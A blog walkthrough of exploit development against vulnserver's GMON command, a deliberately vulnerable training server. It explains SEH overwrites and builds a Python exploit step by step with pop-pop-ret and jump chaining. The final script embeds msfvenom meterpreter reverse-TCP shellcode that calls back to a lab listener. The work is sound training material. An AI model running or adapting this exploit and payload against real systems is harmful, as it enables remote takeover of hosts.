---
title: "Exploiting vulnserver: gmon"
date: 2019-02-07
description: "SEH Overflow"
summary: "SEH Overflow"
tags: ["vulnserver", "buffer overflow", "exploit dev"]
---

This time, the vulnerability is a little different. Again, we start by looking at the code for the __GMON__ command.

## The Code

```csharp
if (strncmp(RecvBuf, "GMON ", 5) == 0) {
	char GmonStatus[13] = "GMON STARTED\n";
	for (i = 5; i < RecvBufLen; i++) {
		if ((char)RecvBuf[i] == '/') {
			if (strlen(RecvBuf) > 3950) {
				Function3(RecvBuf);
			}
			break;
		}
	}				
	SendResult = send( Client, GmonStatus, sizeof(GmonStatus), 0 );
}

...
void Function3(char *Input) {
    char Buffer2S[2000];
    strcpy(Buffer2S, Input);
  }
```

There are two main differences here:

- `if ((char)RecvBuf[i] == '/') {`

	This line checks that the __5th__ character is a `/` and not a `.`. To successfully use the __GMON__ command, we need to send `GMON /` (space followed by a forward slash).

- `if (strlen(RecvBuf) > 3950) {`

	This line checks if the `RecvBuf` (our user supplied input) is larger than `3950` characters. If this is true, the value of `RecvBuf` is passed to `function3`.

So it looks like we need to send a buffer larger than __3950__ characters to cause the overflow. Lets send the `GMON /` command with a buffer of __4000 A's__ to the vulnserver application.

```python
#!/usr/bin/env python

import socket
import sys

buffer = 'A' * 4000
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Sending the initial payload:

<img src="/images/vulnserver/gmon/gmon-send-crash1.png" alt="gmon-send-crash1" width="700"/>

By increasing the buffer of A's to a value over 3950, we have overwritten the Structured Exception Handler (SEH).

<img src="/images/vulnserver/gmon/gmon-crash1-1.png" alt="gmon-crash1-1" width="900"/>

Passing the exception in the debugger (`Shift + F7`), the application attempts to handle the pointer to the current __exception registration record__ (`SEH`) which has been overwritten with the user supplied buffer of A's.

<img src="/images/vulnserver/gmon/gmon-crash1-2.png" alt="gmon-crash1-2" width="900"/>

## Structured Exception Handlers

I found the best explanation for Structured Exception Handlers from [fuzzsecurity](http://www.fuzzysecurity.com/tutorials/expDev/3.html), and __highly recommend__ you go check out the posts there for more exploit dev wizardry. I have quoted the relevant bits below:

> The SEH is a mechanism in Windows that makes use of a data structure called "Linked List" which contains a sequence of data records. When a exception is triggered the operating system will travel down this list. The exception handler can either evaluate it is suitable to handle the exception or it can tell the operating system to continue down the list and evaluate the other exception functions. To be able to do this the exception handler needs to contain two elements (1) a pointer to the current “Exception Registration Record” (SEH) and (2) a pointer to the “Next Exception Registration Record” (nSEH). Since our Windows stack grows downward we will see that the order of these records is reversed [nSEH]...[SEH].

<img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb45.png" alt="seh-chain" width="500"/>

(image from Corelan)

> When a exception occurs in a program function the exception handler will push the elements of it's structure to the stack since this is part of the function prologue to execute the exception. At the time of the exception the SEH will be located at esp+8.
>
> Your probably asking yourself what does all of this have to do with exploit development. If we get a program to store a overly long buffer AND we overwrite a “Structured Exception Handler” windows will zero out the CPU registers so we won't be able to directly jump to our shellcode. Luckily this protection mechanism is flawed. Generally what we will want to do is overwrite SEH with a pointer to a “POP POP RETN” instruction (the POP instruction will remove 4-bytes from the top of the stack and the RETN instruction will return execution to the top of the stack). Remember that the SEH is located at esp+8 so if we increment the stack with 8-bytes and return to the new pointer at the top of the stack we will then be executing nSEH. We then have at least 4-bytes room at nSEH to write some opcode that will jump to an area of memory that we control where we can place our shellcode!!


> In other words, the payload must do the following things
>
> 1) cause an exception. Without an exception, the SEH handler (the one you have overwritten/control) won’t kick in
>
> 2) overwrite the pointer to the next SEH record with some jumpcode (so it can jump to the shellcode)
>
> 3) overwrite the SE handler with a pointer to an instruction that will bring you back to next SEH and execute the jumpcode.
>
> 4) The shellcode should be directly after the overwritten SE Handler. Some small jumpcode contained in the overwritten “pointer to next SEH record” will jump to it).

<img src="https://www.corelan.be/wp-content/uploads/2010/08/image13.png" alt="seh-overwrite" width="500"/>

----

## Exploitation
Like I said, that is such a clear explination that I could not improve on it. So lets go through those motions with the gmon crash.

First lets find out the offsets for __SE handler__ and the __pointer to the next SEH record__ using a pattern from metasploit. Please see the previous blog post on host to generate the unique string.

The updated exploit now looks like this:
```python
#!/usr/bin/env python

import socket
import sys

buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F'
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

<img src="/images/vulnserver/gmon/gmon-send-crash2.png" alt="gmon-send-crash2" width="700"/>

The application crashes again and we can locate the exact bytes that are landing in __SE handler__ and the __pointer to the next SEH record__.

<img src="/images/vulnserver/gmon/gmon-crash2-1.png" alt="gmon-crash2-1" width="900"/>

<img src="/images/vulnserver/gmon/gmon-crash2-2.png" alt="gmon-crash2-2" width="900"/>

After calculating the offsets, we confirm that we can control these values accurately.

```python
#!/usr/bin/env python

import socket
import sys

nseh = 'C' * 4
seh = 'B' * 4
pre_padding = 'A' * 3518
post_padding = 'D' * (4000 - len(pre_padding) - len(seh) - len(nseh))
buffer = pre_padding + nseh + seh + post_padding
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

<img src="/images/vulnserver/gmon/gmon-send-crash3.png" alt="gmon-send-crash3" width="700"/>

<img src="/images/vulnserver/gmon/gmon-crash3.png" alt="gmon-crash3" width="900"/>


We need to overwrite the __SE handler__ with a pointer to an instruction that will bring you back to next SEH and execute the jumpcode. Use mona to find a valid set of instructions using `!mona seh`. Make sure the __ASLR, Rebase, and SafeSEH__ flags are false - else your exploit will not be reliable.

<img src="/images/vulnserver/gmon/gmon-mona-seh-search.png" alt="gmon-mona-seh-search" width="900"/>

Note down the memory address of the instructions and update the exploit. Remember to use little endian.

<img src="/images/vulnserver/gmon/gmon-seh-ppr-validate.png" alt="gmon-seh-ppr-validate" width="500"/>

```python
#!/usr/bin/env python

import socket
import sys

nseh = 'C' * 4
# 625010B4-> pop pop ret in essfunc.dll
seh = '\xB4\x10\x50\x62'
pre_padding = 'A' * 3518
post_padding = 'D' * (4000 - len(pre_padding) - len(nseh) - len(seh))
buffer = pre_padding + nseh + seh + post_padding
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Set a breakpoint at the address of the instruction `625010B4` before execution the script. If all goes well, you will end up at the pop pop ret instruction which will move execution flow to the __pointer to the next SEH record__.

<img src="/images/vulnserver/gmon/gmon-seh-ppr-break-point1-1.png" alt="gmon-seh-ppr-break-point1-1" width="900"/>

Stepping through the crash, we can see the exection return to the __pointer for next seh record__.

<img src="/images/vulnserver/gmon/gmon-seh-ppr-break-point1-2.png" alt="gmon-seh-ppr-break-point1-2" width="900"/>

<img src="/images/vulnserver/gmon/gmon-seh-ppr-break-point1-3.png" alt="gmon-seh-ppr-break-point1-3" width="900"/>


Now we need to overwrite __nseh__ with a short jump instruction to our shellcode which can be located in the buffer of __D's__ that are sent in the payload. (I used `EB` assembly instruction for a short jmp).

A handy trick I learn't was to scroll down to where you would like to jump to, and label the location. For example, I added a label the memory location `023CFFD5` as `stage1`

<img src="/images/vulnserver/gmon/gmon-short-jump1-1.png" alt="gmon-short-jump1-1" width="500"/>

You can now write the jump instruction in the debugger (`JMP stage1`) and reference my label without having to count how many bytes this is away from the current location in memory.

<img src="/images/vulnserver/gmon/gmon-short-jump1-2.png" alt="gmon-short-jump1-2" width="500"/>

<img src="/images/vulnserver/gmon/gmon-short-jump1-3.png" alt="gmon-short-jump1-3" width="500"/>

Set at breakpoint at `stage1` and updated the exploit.

```python
#!/usr/bin/env python

import socket
import sys

# EB 0F -> short jump forward to D's
nseh = '\xEB\x0F\x90\x90'
# 625010B4-> pop pop ret in essfunc.dll
seh = '\xB4\x10\x50\x62'
pre_padding = 'A' * 3518
post_padding = 'D' * (4000 - len(pre_padding) - len(nseh) - len(seh))
buffer = pre_padding + nseh + seh + post_padding
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Running the updated exploit, I noted that part of the remaining buffer of __D's__ was being truncated for some reason. However, we still have a lot of empty space for shellcode in our __pre_padding__ buffer area of __C's__. So let we can use that space for a larger final shellcode payload.

<img src="/images/vulnserver/gmon/gmon-short-jump1-4.png" alt="gmon-short-jump1-4" width="500"/>

I updated the exploit again with space for a decent shellcode payload within the __pre_padding__ buffer of __C's__.

```python
#!/usr/bin/env python

import socket
import sys

# EB 0F -> short jump forward to D's
nseh = '\xEB\x0F\x90\x90'
# 625010B4-> pop pop ret in essfunc.dll
seh = '\xB4\x10\x50\x62'
shellcode = '\x90' * 32
shellcode += '\xCC' * 500
shellcode += '\x90' * 32
pre_padding = 'A' * (3518 - len(shellcode))
post_padding = 'D' * (4000 - len(pre_padding) - len(nseh) - len(seh))
buffer = pre_padding + shellcode + nseh + seh + post_padding
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

<img src="/images/vulnserver/gmon/gmon-near-jump1-1.png" alt="gmon-near-jump1-1" width="700"/>


I ran the updated exploit and stepped through until the short jump instruction. I then scrolled back up through the memory until I located the code cave where the final shellcode payload will reside and repeated the trick of labeling the memory location `shellcode` (Note that I added 32 bytes before the shellcode - this is called a __nopsled__ and is recommended to allow the shellcode unpacker to do it's work).

<img src="/images/vulnserver/gmon/gmon-near-jump1-2.png" alt="gmon-near-jump1-2" width="500"/>

<img src="/images/vulnserver/gmon/gmon-near-jump1-3.png" alt="gmon-near-jump1-3" width="500"/>

<img src="/images/vulnserver/gmon/gmon-near-jump1-4.png" alt="gmon-near-jump1-4" width="500"/>

Again we update the exploit with another jump instruction. This time we are jumping a ways back in memory using the `xE9` Jump Near assembly instruction.

```python
#!/usr/bin/env python

import socket
import sys

# EB 0F -> short jump instruction forward to D's
nseh = '\xEB\x0F\x90\x90'
# 625010B4-> pop pop ret in essfunc.dll
seh = '\xB4\x10\x50\x62'
shellcode = '\x90' * 32
shellcode += '\xCC' * 500
shellcode += '\x90' * 32
pre_padding = 'A' * (3518 - len(shellcode))
# E9 B6 FD FF FF -> near jump instruction back to shellcode
jmp = '\x90' * 9 + '\xE9\xB6\xFD\xFF\xFF'
post_padding = 'D' * (4000 - len(pre_padding) - len(nseh) - len(seh) - len(jmp))
buffer = pre_padding + shellcode + nseh + seh + jmp + post_padding
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

The control of execution now looks something like: Jump Short forward to buffer of D's which contain a Jump Near back to buffer of C's (and final shellcode).

<img src="/images/vulnserver/gmon/gmon-near-jump1-5.png" alt="gmon-near-jump1-5" width="500"/>

<img src="/images/vulnserver/gmon/gmon-near-jump1-6.png" alt="gmon-near-jump1-6" width="500"/>

Updating the final exploit with a shellcode.

```python
#!/usr/bin/env python

import socket
import sys

# EB 0F -> short jump forward to D's
nseh = '\xEB\x0F\x90\x90'
# 625010B4-> pop pop ret in essfunc.dll
seh = '\xB4\x10\x50\x62'
# msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.185.148 LPORT=4444 -b "\x00" -f python
shellcode = '\x90' * 32
shellcode += '\xbe\xb3\xa7\xe5\x04\xd9\xe9\xd9\x74\x24\xf4\x58\x2b'
shellcode += '\xc9\xb1\x56\x31\x70\x13\x03\x70\x13\x83\xe8\x4f\x45'
shellcode += '\x10\xf8\x47\x08\xdb\x01\x97\x6d\x55\xe4\xa6\xad\x01'
shellcode += '\x6c\x98\x1d\x41\x20\x14\xd5\x07\xd1\xaf\x9b\x8f\xd6'
shellcode += '\x18\x11\xf6\xd9\x99\x0a\xca\x78\x19\x51\x1f\x5b\x20'
shellcode += '\x9a\x52\x9a\x65\xc7\x9f\xce\x3e\x83\x32\xff\x4b\xd9'
shellcode += '\x8e\x74\x07\xcf\x96\x69\xdf\xee\xb7\x3f\x54\xa9\x17'
shellcode += '\xc1\xb9\xc1\x11\xd9\xde\xec\xe8\x52\x14\x9a\xea\xb2'
shellcode += '\x65\x63\x40\xfb\x4a\x96\x98\x3b\x6c\x49\xef\x35\x8f'
shellcode += '\xf4\xe8\x81\xf2\x22\x7c\x12\x54\xa0\x26\xfe\x65\x65'
shellcode += '\xb0\x75\x69\xc2\xb6\xd2\x6d\xd5\x1b\x69\x89\x5e\x9a'
shellcode += '\xbe\x18\x24\xb9\x1a\x41\xfe\xa0\x3b\x2f\x51\xdc\x5c'
shellcode += '\x90\x0e\x78\x16\x3c\x5a\xf1\x75\x28\xaf\x38\x86\xa8'
shellcode += '\xa7\x4b\xf5\x9a\x68\xe0\x91\x96\xe1\x2e\x65\xaf\xe6'
shellcode += '\xd0\xb9\x17\x66\x2f\x3a\x67\xae\xf4\x6e\x37\xd8\xdd'
shellcode += '\x0e\xdc\x18\xe1\xda\x48\x13\x75\x25\x24\x9a\x11\xcd'
shellcode += '\x36\xdd\x08\x52\xbf\x3b\x7a\x3a\xef\x93\x3b\xea\x4f'
shellcode += '\x44\xd4\xe0\x40\xbb\xc4\x0a\x8b\xd4\x6f\xe5\x65\x8c'
shellcode += '\x07\x9c\x2c\x46\xb9\x61\xfb\x22\xf9\xea\x09\xd2\xb4'
shellcode += '\x1a\x78\xc0\xa1\x7c\x82\x18\x32\xe9\x82\x72\x36\xbb'
shellcode += '\xd5\xea\x34\x9a\x11\xb5\xc7\xc9\x22\xb2\x38\x8c\x12'
shellcode += '\xc8\x0f\x1a\x1a\xa6\x6f\xca\x9a\x36\x26\x80\x9a\x5e'
shellcode += '\x9e\xf0\xc9\x7b\xe1\x2c\x7e\xd0\x74\xcf\xd6\x84\xdf'
shellcode += '\xa7\xd4\xf3\x28\x68\x27\xd6\x2a\x6f\xd7\xa4\x04\xc8'
shellcode += '\xbf\x56\x15\xe8\x3f\x3d\x95\xb8\x57\xca\xba\x37\x97'
shellcode += '\x33\x11\x10\xbf\xbe\xf4\xd2\x5e\xbe\xdc\xb3\xfe\xbf'
shellcode += '\xd3\x6f\xf1\xba\x9c\x90\xf2\x3a\xb5\xf4\xf3\x3a\xb9'
shellcode += '\x0a\xc8\xec\x80\x78\x0f\x2d\xb7\x73\x3a\x10\x9e\x19'
shellcode += '\x44\x06\xe0\x0b'
shellcode += '\x90' * 32
pre_padding = 'A' * (3518 - len(shellcode))
# E9 B6 FD FF FF -> near jump instruction back to shellcode
jmp = '\x90' * 9 + '\xE9\xB6\xFD\xFF\xFF'
post_padding = 'D' * (4000 - len(pre_padding) - len(nseh) - len(seh) - len(jmp))
buffer = pre_padding + shellcode + nseh + seh + jmp + post_padding
command = 'GMON /'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

<img src="/images/vulnserver/gmon/gmon-final-exploit1-1.png" alt="gmon-final-exploit1-1" width="700"/>

<img src="/images/vulnserver/gmon/gmon-final-exploit1-2.png" alt="gmon-final-exploit1-2" width="700"/>
